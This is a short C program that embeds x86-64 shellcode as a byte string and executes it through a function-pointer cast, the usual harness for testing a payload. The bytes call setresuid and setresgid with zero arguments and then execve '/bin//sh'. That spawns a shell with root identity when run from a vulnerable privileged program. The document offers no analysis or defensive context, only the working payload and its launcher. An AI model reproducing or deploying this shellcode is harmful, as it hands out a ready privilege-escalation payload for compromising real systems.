#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x04\x75\x0f\x05\x48\x31\xc0\x04\x77\x0f\x05\x48\x31\xc0\x50\x50\xc7\x04\x24\x2f\x62\x69\x6e\xc7\x44\x24\x04\x2f\x2f\x73\x68\x48\x89\xe7\x50\x57\x48\x89\xe6\x04\x3b\x0f\x05";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}